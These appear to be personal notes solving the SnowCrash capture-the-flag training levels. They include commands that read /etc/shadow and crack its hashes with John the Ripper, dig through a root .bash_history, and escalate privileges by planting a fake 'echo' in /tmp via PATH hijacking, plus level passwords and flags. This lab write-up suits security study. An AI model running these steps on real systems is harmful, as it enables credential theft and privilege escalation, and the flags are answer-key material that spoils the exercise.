copy files
	"7z x -oSnowCrash SnowCrash.iso"
	http://www.octetmalin.net/linux/tutoriels/ubuntu-personnaliser-live-cd-usb.php

method to search:
	grep -d recurse [SEARCH] . 2>/dev/null | cut -d":" -f 1 | sort | uniq
	find . -name "*[SEARCH]*"

method for executables:
	try it
	permissions
	strings
	ltrace




level00 -> level00
	vim ./root/.bash_history
	find / -user flag00 2>/dev/null
	cat /usr/sbin/john
		search for "sbin john" -> john the ripper ?

	flag00 -> nottoohardhere (caesar +15)

level01 -> x24ti5gi3x0ol2eh4esiuxias
	unshadow /etc/passwd /etc/shadow > mypasswd
	john mypasswd

	flag01 -> abcdefg

level02 -> f2av5il02puano7naaf6adaaf
	tcpick -C -yP -r level02.pcap
	grep -d recurse "ft_wa"
	root/.bash_history:echo "flag02:ft_waNDReL0L" | chpasswd

	flag02 -> ft_waNDReL0L (zero inside)

level03 -> kooda2puivaav1idi4f57q8iq
	try level03
	strings level03 -> /usr/bin/env echo Exploit me
	ltrace level03 -> permissions -> echo substitute to getflag
	find . -writable -type d 2>/dev/null
	vim /tmp/echo -> "#!/bin/bash
	getflag"
	export PATH=/tmp:$PATH
	
	flag03 -> X

level04 -> qi0maab88jeaj46qoumi7maus

	flag04 -> X

level05 -> ne2searoevaevoem4ov4ar8ap
	

in gdb
	break system
	x/1s 0x080485e0



mkisofs -o SnowCrash_mod.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V "Custom SnowCrash Iso" ../SnowCrash
